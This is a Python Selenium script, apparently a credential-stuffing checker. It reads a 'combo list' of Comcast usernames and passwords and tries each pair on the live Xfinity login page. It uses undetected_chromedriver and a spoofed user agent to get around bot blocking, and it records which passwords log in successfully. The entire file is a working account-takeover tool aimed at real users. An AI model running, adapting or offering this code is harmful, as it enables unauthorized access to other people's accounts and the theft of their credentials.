# IMPORTS
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
import undetected_chromedriver as uc
from time import sleep
from selenium.webdriver.support.ui import WebDriverWait
from datetime import datetime
import numpy as np
import pandas as pd

# configurando service para att webdriver automaticamente...
service = Service(ChromeDriverManager().install())
options = uc.ChromeOptions()
user_agent = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.50 Safari/537.36' # se tiver "headless" no user_agent o site bloqueia o acesso
options.add_argument('user-agent={0}'.format(user_agent))
# options.add_argument('--headless') # need to be headless or email_field doesn't works
# options.add_argument('--no-sandbox')
# options.add_argument('--mute-audio')
driver = uc.Chrome(use_subprocess=True, service=service, options=options)
driver.get("https://login.xfinity.com/login")

def valida_email(email):
    WebDriverWait(driver, 10).until(lambda x: x.find_element('xpath', '//input[@placeholder="Email, mobile, or username"]'), "not found email_field ")
    email_field = driver.find_element('xpath', '//input[@placeholder="Email, mobile, or username"]')
    email_field.send_keys(email)
    email_field.submit()
    print(f'{datetime.now()} - submit email.')
    
def valida_senha(password):
    password_field = driver.find_elements('xpath', '//input[@id = "passwd"]')
    if bool(password_field):
        password_field[0].send_keys(password)
        password_field[0].submit()
        print(f'{datetime.now()} - submit password. (aguardando resultado)')
        return True
    else: 
        print(f'{datetime.now()} - Falha ao encontrar password_field. (aguardando resultado)')
        return False

emails_test = pd.read_csv('PRUEBA XFINITI/COMBO LIST COMCAST.csv') # importando df
dict_correos_validos = emails_test.to_dict() # convertendo p dict
qt_correos_validos = len(dict_correos_validos['user']) # quantidade de itens p for
dict_correos_validos['contrasena'] = {} # novo valores q serão adicionados ao dict

print('convertendo csv to dict...')

x = 0 # qt de itens validos
for i in range(qt_correos_validos):
    email = dict_correos_validos['user'][i]
    password = dict_correos_validos['password'][i]
    resultado = dict_correos_validos['resultado'][i]
    if resultado == 'correo valido':
        print(f'{datetime.now()} | pruebando index {i}: {email}')
        password_encontrado = False
        conut_for_while = 0
        while password_encontrado == False:
            conut_for_while += 1
            if conut_for_while > 5:
                print('5 tentativas de login falhadas')
                dict_correos_validos['contrasena'][i] = 'FALHA AO ANALISAR'
                break
            valida_email(email)
            sleep(7)
            if valida_senha(password):
                sleep(10)
                print(f'{datetime.now()} | URL: {driver.current_url}' )
                if 'overview' in driver.current_url or 'security-check' in driver.current_url: # login sucess
                    dict_correos_validos['contrasena'][i] = 'contrasena valida'
                    print(f'{datetime.now()} | contrasena valida')
                else: # não logou...
                    dict_correos_validos['contrasena'][i] = 'contrasena mala'
                    print(f'{datetime.now()} | contrasena mala')
                password_encontrado = True

            driver.get("https://login.xfinity.com/login")
        
        if  x % 10 == 0:
            print(f'{datetime.now()} - realizando bkp da planilha...')
            dataset = pd.DataFrame(dict_correos_validos)
            dataset.to_csv(f'bkps_cache/bkp_itens_validos-{x/10}.csv', index=False) 
        print('---------------------------------------------------------------------')
        x += 1
    else: 
        dict_correos_validos['contrasena'][i] = 'null'

dataset = pd.DataFrame(dict_correos_validos)
dataset.to_csv(f'result-{datetime.now().timestamp()}.csv', index=False) 
print('FINISH!!!!')